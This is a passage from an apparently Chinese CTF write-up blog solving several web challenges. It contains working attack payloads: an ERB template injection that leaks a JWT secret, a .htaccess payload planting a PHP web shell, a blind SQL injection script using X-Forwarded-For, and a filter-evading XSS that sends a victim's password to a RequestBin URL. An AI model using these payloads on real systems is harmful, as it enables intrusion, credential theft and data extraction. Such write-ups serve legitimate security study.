class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br><br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br><br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br><br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br><br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br><br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br><br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>Ruby ERB模板注入</p><p><a href="https://www.anquanke.com/post/id/86867">【技术分享】手把手教你如何完成Ruby ERB模板注入</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt; is working<br>//urlencode<br>work?SECRET=&amp;name=%3C%25%3D%24&#x27;%25%3E&amp;do=%3C%25%3D%24&#x27;%25%3E%20is%20working<br></code></pre></td></tr></table></figure><p>返回如下，这样就拿到了当下的jwt token和key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs none">HTTP/1.1 200 OK<br>Server: openresty<br>Date: Tue, 10 Aug 2021 08:55:15 GMT<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 176<br>Connection: close<br>Set-Cookie: auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJmMDBmZjcwNi02ZDFhLTQzOGQtOGM0OC02ZWMyYTNkN2Y1MzIiLCJqa2wiOjc1fQ.KH-pPeCd_V98pV9VdNCGEATa3XofmPKd934pW7mDqvw; domain=0e50b8a0-5392-476e-a5ce-cd30228e8582.node4.buuoj.cn; path=/; HttpOnly<br>X-Content-Type-Options: nosniff<br>X-Frame-Options: SAMEORIGIN<br>X-Xss-Protection: 1; mode=block<br><br>&lt;script&gt;alert(&#x27;ebe18e25bc2e1a0d8d48db9b6df08d7101eed13861254583d435edf271c197e636d5e57a74a650fc39cbeaf4a78226d8290f2407cc0471d1314a5f4ea44d1877 working successfully!&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>有了key后直接修改金额</p><p>返回成功</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062229704.png" alt="img"></p><p>flag藏在jwt里</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062230898.png" alt="img"></p><h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写入文件，限定当前目录下非”index.php”的文件都会被删除。</p><p>考虑写入.htaccess文件，它比较灵活，不需要重启服务器，也不需要管理员权限。其格式为<code>php_value 名称 值</code>，在这里写入🐎（以注释的方式），然后在页面顶部加载它</p><p>存在对file的过滤 ,在.htaccess中\的作用是拼接上下文</p><p>#在htaccess文件中是注释符的意思，但是在执行php文件中会直接执行后面的一句话，\的作用是注释后面的拼接，以执行命令</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fi\</span><br><span class="language-xml">le &quot;.htaccess&quot;</span><br><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>auto_prepend_fi\%<span class="hljs-number">0</span>ale%<span class="hljs-number">20</span><span class="hljs-string">&quot;.htaccess&quot;</span>%<span class="hljs-number">0</span>a%<span class="hljs-number">23</span>%<span class="hljs-number">20</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span>\<br></code></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>看源代码发现</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410232234635.png" alt="image-20241023223417501"></p><p>通过X-Forwarded-For，可以伪造我们的IP，而且还会显示last和current，ip</p><p>先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or ‘1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为1。</p><p>就是需要尝试三次，我们第一次输入的ip才会进入数据库的查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://node5.buuoj.cn:26696/&quot;</span><br><br><span class="hljs-comment">#这个head头好像必须加cookie</span><br>head =&#123;<br>    <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">&quot;track_uuid=9c34a137-919c-4ae0-b8ed-c71fd0d775bc&quot;</span><br>&#125;<br><br><span class="hljs-comment"># #查库名</span><br><span class="hljs-comment">#payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br><span class="hljs-comment"># #查表名</span><br><span class="hljs-comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br><span class="hljs-comment"># #查列名</span><br><span class="hljs-comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br><span class="hljs-comment">#查flag</span><br>payload = <span class="hljs-string">&quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br>flag =<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    low = <span class="hljs-number">32</span><br>    high =<span class="hljs-number">137</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">while</span>(low &lt; high):<br>        <span class="hljs-built_in">print</span>(i,mid)<br>        <span class="hljs-string">&#x27;&#x27;&#x27;插入sql语句&#x27;&#x27;&#x27;</span><br>        payload1 = payload.<span class="hljs-built_in">format</span>(i,mid)<br>        head[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>] = payload1<br>        <span class="hljs-built_in">print</span>(head[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>])<br>        r = requests.get(url,headers=head)<br><br>        <span class="hljs-string">&#x27;&#x27;&#x27;重新发送两次请求&#x27;&#x27;&#x27;</span><br>        head[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>]= <span class="hljs-string">&quot;penson&quot;</span><br>        r = requests.get(url,headers=head)<br>        r = requests.get(url,headers=head)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Last Ip: 1 &quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br><br>        mid =(low+high)//<span class="hljs-number">2</span><br><br><br>    <span class="hljs-keyword">if</span>(mid ==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid ==<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">break</span><br>    flag +=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>注册登录</p><p>加载了一个<code>js</code>文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">var</span> cookies = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;; &#x27;</span>);<br><span class="hljs-keyword">var</span> cookie = &#123;&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cookies.<span class="hljs-property">length</span>; i++) &#123;<br><span class="hljs-keyword">var</span> arr = cookies[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>);<br><span class="hljs-keyword">var</span> key = arr[<span class="hljs-number">0</span>];<br>cookie[key] = arr[<span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;user&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;psw&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span>)&#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;username&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;password&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;psw&#x27;</span>];<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，用户名和密码都填入了表单<br>登录成功后有一个<code>feedback.php</code>的用户反馈<br><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410242208874.png" alt="image-20241024220859718"></p><p>在这个页面的源码中存在注释</p><pre><code class="hljs">        if(is_array($feedback))&#123;            echo &quot;&lt;script&gt;alert(&#39;反馈不合法&#39;);&lt;/script&gt;&quot;;            return false;        &#125;        $blacklist = [&#39;_&#39;,&#39;\&#39;&#39;,&#39;&amp;&#39;,&#39;\\&#39;,&#39;#&#39;,&#39;%&#39;,&#39;input&#39;,&#39;script&#39;,&#39;iframe&#39;,&#39;host&#39;,&#39;onload&#39;,&#39;onerror&#39;,&#39;srcdoc&#39;,&#39;location&#39;,&#39;svg&#39;,&#39;form&#39;,&#39;img&#39;,&#39;src&#39;,&#39;getElement&#39;,&#39;document&#39;,&#39;cookie&#39;];        foreach ($blacklist as $val) &#123;            while(true)&#123;                if(stripos($feedback,$val) !== false)&#123;                    $feedback = str_ireplace($val,&quot;&quot;,$feedback);                &#125;else&#123;                    break;                &#125;            &#125;        &#125;</code></pre><p>RequestBin提供了一个URL，该URL将收集对其发出的请求</p><p>poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">incookieput</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">incookieput</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scrcookieipt</span> <span class="hljs-attr">scookierc</span>=<span class="hljs-string">&quot;./js/login.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scrcookieipt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scrcookieipt</span>&gt;</span><br>    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;<br>    docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/1e8jfct1/?a=&quot;+psw;<br><span class="hljs-tag">&lt;/<span class="hljs-name">scrcookieipt</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410242210671.png" alt="image-20241024221023578"></p><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><a href="https://xz.aliyun.com/t/7791">xpath注入</a>这篇文章有关于xpath很详细的解答，包括原理等，详细了解请见此篇.</p><p>打开网页，登陆框</p><p><img src="https://img2020.cnblogs.com/blog/1960851/202008/1960851-20200805135615946-1047568535.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>s = requests.session()<br>url =<span class="hljs-string">&#x27;http://47e7790f-8a53-4efa-988b-7a350ebb91d5.node3.buuoj.cn//login.php&#x27;</span><br><br><br><br>head =&#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 